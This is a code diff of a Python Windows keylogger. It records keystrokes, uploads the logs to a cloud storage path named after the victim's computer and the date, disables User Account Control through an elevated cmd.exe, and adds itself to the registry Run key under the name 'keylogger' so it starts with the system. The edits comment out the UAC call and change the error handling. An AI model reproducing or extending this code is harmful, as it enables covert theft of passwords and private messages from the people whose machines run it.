@@ -21,7 +21,7 @@ def disable_UAC():
     win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command2)
 
 
-disable_UAC()
+#disable_UAC()
 
 
 def is_admin():
@@ -82,7 +82,7 @@ def on_press(key):
 
             storage.child(pcName + '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
-            print('!')
+
             f = open('data.txt', 'a+', encoding='utf-8')
         printKey(key)
     except Exception as e:
@@ -184,8 +184,8 @@ def addToStartup():
                              winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, 'keylogger', 0,
                           winreg.REG_SZ, exePath)  # file_path is path of file after coping it
-    except:
-        pass
+    except Exception as e:
+        print(e)
 
 
 addToStartup()
